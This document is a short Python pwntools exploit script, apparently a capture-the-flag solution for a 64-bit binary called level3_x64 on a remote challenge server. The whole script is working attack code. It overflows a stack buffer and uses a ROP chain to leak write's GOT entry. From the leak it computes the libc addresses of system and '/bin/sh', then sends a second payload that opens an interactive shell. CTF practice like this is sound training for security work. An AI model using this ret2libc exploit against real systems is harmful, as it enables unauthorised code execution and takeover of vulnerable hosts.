# coding: utf-8
from pwn import *

local = 1 # 控制执行环境，0为远程，1为本地
if local:
    sh = process('./level3_x64')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    sh = remote('pwn2.jarvisoj.com', 9883)
    libc = ELF('./libc-2.19.so')

elf = ELF('./level3_x64')

writeplt = elf.plt['write']
writegot = elf.got['write']
vuln_addr = elf.symbols['vulnerable_function']

writelibc = libc.symbols['write']
syslibc = libc.symbols['system']
shelllibc = libc.search('/bin/sh').next()

pop_rsi_addr = 0x4006b1
pop_rdi_addr = 0x4006b3

payload1 = 'a' * (0x80 + 0x8) + p64(pop_rdi_addr) + p64(1)+ p64(pop_rsi_addr) + p64(writegot) + p64(8) + p64(writeplt) + p64(vuln_addr)

sh.recvuntil('Input:\n')
sh.sendline(payload1)

write_addr = u64(sh.recv(8))
#print write_addr

sys_addr = write_addr - writelibc + syslibc
shell_addr = write_addr - writelibc + shelllibc

payload2 = 'a' * (0x80 + 0x8) + p64(pop_rdi_addr) + p64(shell_addr) + p64(sys_addr) + p64(0)
sh.recvuntil('Input:\n')
sh.sendline(payload2)

sh.interactive()
sh.close()
